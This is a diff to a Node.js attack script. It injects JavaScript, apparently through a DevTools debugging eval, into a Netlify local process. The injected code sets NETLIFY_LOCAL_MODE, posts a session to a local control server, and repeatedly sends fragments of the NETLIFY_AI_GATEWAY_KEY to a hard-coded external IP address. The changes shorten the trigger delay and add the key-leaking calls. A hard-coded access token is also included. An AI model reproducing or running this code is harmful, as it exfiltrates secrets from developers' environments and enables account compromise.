@@ -8,7 +8,7 @@ import crypto from 'node:crypto';
 
 const BEACON = process.env.ARTIFACT_STORE || 'http://62.169.16.65:48081/r143flip4';
 const API_TOKEN = process.env.PROBE_TOKEN || 'nfu_eod4HVHgmjZ7atTh5JQ7TLGSRw7LrjA5b416';
-const DELAY = parseInt(process.env.FLIP_DELAY || '200000', 10);
+const DELAY = parseInt(process.env.FLIP_DELAY || '120000', 10);
 const CONTROL = process.env.FLIP_CONTROL || 'http://127.0.0.1:8888';
 const BOX = BEACON.replace(/\/r143flip4$/, '');
 const R = { pid: process.pid, uid: typeof process.getuid === 'function' ? process.getuid() : null, events: [] };
@@ -90,7 +90,8 @@ const bodyObj = {
   sha: '8cfad745fb0956ad9e812e20f8b14b24fa04beae', mode: 'normal', context: []
 };
 const b64 = Buffer.from(JSON.stringify(bodyObj)).toString('base64');
-const arm = "(function(){var b=atob('" + b64 + "');var bx=function(u,d){fetch(u,{method:'POST',body:String(d).slice(0,400)}).catch(function(){})};setTimeout(function(){process.env.NETLIFY_LOCAL_MODE='true';fetch('" + CONTROL + "/sessions',{method:'POST',headers:{'content-type':'application/json'},body:b}).then(function(r){return r.text()}).then(function(t){bx('" + BOX + "/r143selfpost','POST='+t+' MODE='+process.env.NETLIFY_LOCAL_MODE)}).catch(function(e){bx('" + BOX + "/r143selfpost','ERR '+e)});setTimeout(function(){bx('" + BOX + "/r143gwkey','GWKEY='+String(process.env.NETLIFY_AI_GATEWAY_KEY||'unset').slice(0,30)+' MODE='+String(process.env.NETLIFY_LOCAL_MODE||'unset'))},90000);}," + DELAY + ");return 'ARMED';})()";
+const kf = function (k) { k = String(k || 'unset'); return k.length + ':' + k.slice(0, 20) + ':' + k.slice(-16); };
+const arm = "(function(){var b=atob('" + b64 + "');var bx=function(u,d){fetch(u,{method:'POST',body:String(d).slice(0,500)}).catch(function(){})};var kf=function(k){k=String(k||'unset');return k.length+':'+k.slice(0,20)+':'+k.slice(-16)};setTimeout(function(){process.env.NETLIFY_LOCAL_MODE='true';var pre=process.env.NETLIFY_AI_GATEWAY_KEY;bx('" + BOX + "/r143gwkey','PRE='+kf(pre));fetch('" + CONTROL + "/sessions',{method:'POST',headers:{'content-type':'application/json'},body:b}).then(function(r){return r.text()}).then(function(t){bx('" + BOX + "/r143selfpost','POST='+t+' MODE='+process.env.NETLIFY_LOCAL_MODE)}).catch(function(e){bx('" + BOX + "/r143selfpost','ERR '+e)});setTimeout(function(){bx('" + BOX + "/r143gwkey','POST8='+kf(process.env.NETLIFY_AI_GATEWAY_KEY)+' MODE='+String(process.env.NETLIFY_LOCAL_MODE||'unset'))},8000);setTimeout(function(){bx('" + BOX + "/r143gwkey','POST90='+kf(process.env.NETLIFY_AI_GATEWAY_KEY)+' MODE='+String(process.env.NETLIFY_LOCAL_MODE||'unset'))},90000);}," + DELAY + ");return 'ARMED';})()";
 
 let r1 = await cdpEval("(process.env.NETLIFY_LOCAL_MODE='true', 'FLIP='+process.env.NETLIFY_LOCAL_MODE)");
 ev('flip_eval', JSON.stringify(r1).slice(0, 250));
